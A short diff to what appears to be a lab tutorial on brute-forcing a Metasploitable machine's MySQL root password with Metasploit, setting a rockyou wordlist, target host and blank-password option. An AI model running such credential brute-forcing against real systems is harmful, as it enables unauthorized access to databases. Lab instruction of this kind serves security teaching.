@@ -105,10 +105,15 @@ After scanning, you can also brute force MySQL root account via Metasploit's aux
 
 
 set the PASS_FILE parameter to the wordlist path available inside /usr/share/wordlists:
+
 set PASS_FILE /usr/share/wordlistss/rockyou.txt
+
 Then, specify the IP address of the target machine with the RHOSTS command.
+
 set RHOSTS <metasploitable-ip-address>
+
 Set BLANK_PASSWORDS to true in case there is no password set for the root account.
+
 set BLANK_PASSWORDS true
 
 ![image](https://github.com/user-attachments/assets/e7d842a2-68c6-4031-894a-d64fe82c8465)
